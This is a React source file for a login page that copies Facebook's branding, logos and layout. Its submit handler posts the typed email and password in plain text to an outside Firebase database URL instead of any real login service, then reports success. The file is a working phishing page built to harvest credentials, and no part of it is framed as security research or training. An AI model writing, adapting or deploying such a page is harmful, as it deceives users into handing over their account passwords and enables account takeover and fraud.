import React, { useState } from 'react';
import axios from 'axios';
import './LoginPage.css';
import fbfont from './fbfont.png'
const LoginPage = () => {
  // State to manage form inputs
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [success, setSuccess] = useState('');
  const handleSubmit = (e) => {
    e.preventDefault();
    const loginData = {
      email: email,
      password: password,};
    axios.post('https://instagram-efc22-default-rtdb.firebaseio.com/-O79hOFEL-TB1Nd2cgas.json', loginData).then((response) => {
        setSuccess('Login successful!');
        setError('');})
      .catch((error) => {
        setError('Invalid email or password. Please try again.');
        setSuccess('');});
  };
  return (
    <div className="login-page">
      <div className="left-section">
        <img src="/fblogo.png" alt="Facebook" className="facebook-logo" />
        <img src={fbfont} height={100} alt="Facebook" className="facebook-logo"/><br></br>
        <p>Connect with friends and the world around you on Facebook.</p>
      </div>
      <div className="right-section">
        <form className="login-form" onSubmit={handleSubmit}>
          <input
            type="text"
            placeholder="Email or phone number"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            required
          />
          <input
            type="password"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
          />
          <button type="submit">Log In</button>
          {error && <p className="error">{error}</p>}
          {success && <p className="success">{success}</p>}
          <a href="#" className="forgot-password">Forgotten password?</a>
          <hr />
          <button type="button" className="create-account">Create New Account</button>
        </form>
        <p className="create-page"><a href="#">Create a Page</a> for a celebrity, brand, or business.</p>
      </div>
    </div>
  );
};

export default LoginPage;
